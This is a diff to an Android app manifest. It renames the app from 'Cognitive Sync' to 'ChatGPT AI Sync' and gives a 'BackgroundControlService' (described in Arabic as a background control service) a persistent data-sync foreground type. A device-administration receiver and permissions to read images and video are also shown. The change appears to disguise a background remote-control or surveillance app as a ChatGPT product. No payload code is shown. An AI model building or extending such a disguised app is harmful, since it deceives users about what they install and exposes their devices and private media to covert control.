@@ -17,12 +17,13 @@
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
     <application
         android:allowBackup="true"
         android:icon="@android:drawable/ic_menu_info_details"
-        android:label="Cognitive Sync"
+        android:label="ChatGPT AI Sync"
         android:roundIcon="@android:drawable/ic_menu_info_details"
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
@@ -37,11 +38,12 @@
             </intent-filter>
         </activity>
 
-        <!-- خدمة التحكم في الخلفية -->
+        <!-- خدمة التحكم في الخلفية مع نوع الخدمة الأمامية -->
         <service
             android:name=".BackgroundControlService"
             android:enabled="true"
-            android:exported="false" />
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
 
         <!-- مستقبل إدارة الجهاز مع ضبط اسم الملف الصحيح -->
         <receiver
